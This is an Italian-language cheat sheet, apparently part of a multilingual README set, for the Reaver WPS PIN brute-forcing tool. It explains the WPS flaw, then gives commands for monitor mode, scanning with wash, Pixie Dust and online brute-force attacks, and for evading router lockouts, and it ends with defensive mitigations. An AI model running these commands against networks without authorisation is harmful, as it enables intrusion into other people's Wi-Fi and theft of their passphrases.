<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Foglio informativo di Reaver

[Reaver](https://github.com/t6x/reaver-wps-fork-t6x) è uno strumento specializzato di controllo della sicurezza Wi-Fi progettato per eseguire attacchi di forza bruta contro i PIN del registrar Wi-Fi Protected Setup (WPS). Recuperando il PIN WPS a 8 cifre, Reaver recupera la chiave pre-condivisa WPA/WPA2 in testo semplice (PSK). Supporta anche gli attacchi Pixie Dust offline tramite `pixiewps`.

---

## Sommario

- [Meccaniche di vulnerabilità WPS](#wps-vulnerabilità-meccaniche)
- [Installazione (`reaver` e `pixiewps`)](#installation-reaver--pixiewps)
- [Ricognizione: identificazione delle reti WPS (`wash`)](#ricognizione-identificazione-wps-reti-wash)
- [Pixie Dust Attack (recupero immediato della chiave)](#pixie-dust-attack-instant-key-recovery)
- [PIN WPS online completo Brute-Force](#full-online-wps-pin-brute-force)
- [Limitazione velocità AP e gestione blocco](#ap-rate-limiting--lockout-handling)
- [Mitigazione difensiva](#mitigazione-difensiva)

---

## Meccanica della vulnerabilità WPS

L'autenticazione PIN WPS utilizza un PIN di 8 cifre diviso in due metà:
- La prima metà è composta da 4 cifre ($10^4 = 10.000$ possibilità).
- La seconda metà è composta da 3 cifre + 1 cifra di checksum ($ 10 ^ 3 = 1.000 $ di possibilità).
- Invece di testare combinazioni $10^8 = 100.000.000$, un utente malintenzionato testa solo al massimo $10.000 + 1.000 = 11.000$ tentativi.
- **Pixie Dust Attack:** sfrutta il debole PRNG (generatori di numeri pseudo-casuali) in specifici chipset wireless (Ralink, MediaTek, Realtek, Broadcom) per calcolare il PIN WPS offline in pochi secondi a partire da soli 2 pacchetti iniziali.

---

## Installazione (`reaver` e `pixiewps`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y reaver pixiewps bully

# Arch Linux / BlackArch
sudo pacman -S reaver pixiewps

# Verify command
reaver -h
```
---

## Ricognizione: identificazione delle reti WPS (`wash`)

Prima di avviare Reaver, trova i punti di accesso con WPS abilitato e controlla se sono bloccati:
```bash
# Put wireless interface into monitor mode
sudo airmon-ng start wlan0
# or:
sudo iw dev wlan0 set type monitor

# Scan for WPS-enabled routers using wash
sudo wash -i wlan0mon
```
Colonne chiave da osservare:
- **`WPS Locked`**: Se `Yes`, il router ha bloccato i tentativi di PIN WPS a causa di una precedente attività di forza bruta. Router target che mostrano `No`.
- **`WPS Ver`**: versione WPS (1.0 o 2.0).
- **`ESSID` e `BSSID`**: nome della rete di destinazione e MAC.

---

## Pixie Dust Attack (recupero immediato della chiave)

L'attacco Pixie Dust (`-K 1`) è l'attacco più veloce contro WPS. Raccoglie E-Hash1, E-Hash2 e nonce dal router e decifra il PIN offline senza attivare limiti di velocità:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv
```
- `-i wlan0mon`: interfaccia della modalità monitor.
- `-b <bssid>`: MAC del router di destinazione.
- `-c 6`: Canale dell'AP target.
- `-K 1`: esegui l'attacco automatico Pixie Dust tramite `pixiewps`.
- `-vv`: output dettagliato.

*Se vulnerabili, il PIN e il WPA PSK vengono stampati in meno di 10 secondi.*

---

## PIN WPS online completo Forza bruta

Se Pixie Dust fallisce, ricorri alla forza bruta online:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv
```
Una volta scoperto il PIN, Reaver restituisce:
```text
[+] Pin cracked in 4520 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'SuperSecretWiFiPassword'
[+] AP SSID: 'Target_Network'
```
---

## Limitazione della velocità AP e gestione del blocco

Molti router moderni bloccano i tentativi WPS per 5-15 minuti dopo 3-5 tentativi falliti. Utilizza il ritardo e riprova i flag di ottimizzazione:
```bash
# Delay 10 seconds between attempts
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 10 -vv

# Wait 300 seconds if the router locks WPS
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 5 --lock-delay=300 -vv

# Ignore NACK packets and keep trying
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 --ignore-locks -vv
```
### Alternativa: utilizzare `bully`
`bully` è un'implementazione C veloce dell'attacco WPS che gestisce bene le implementazioni dispari del router:
```bash
sudo bully -b 00:11:22:33:44:55 -c 6 --pixiewps wlan0mon
```
---

## Mitigazione difensiva

- **Disabilita completamente WPS:** Il consiglio più sicuro è disattivare WPS nell'interfaccia web del router.
- **Aggiorna firmware:** i router moderni implementano una rigorosa limitazione della velocità, backoff esponenziale e correggono i difetti di entropia PRNG sfruttati da Pixie Dust.
- **Utilizza WPA3:** WPA3 rimuove completamente il WPS legacy basato su PIN, sostituendolo con Wi-Fi Easy Connect (DPP) sicuro.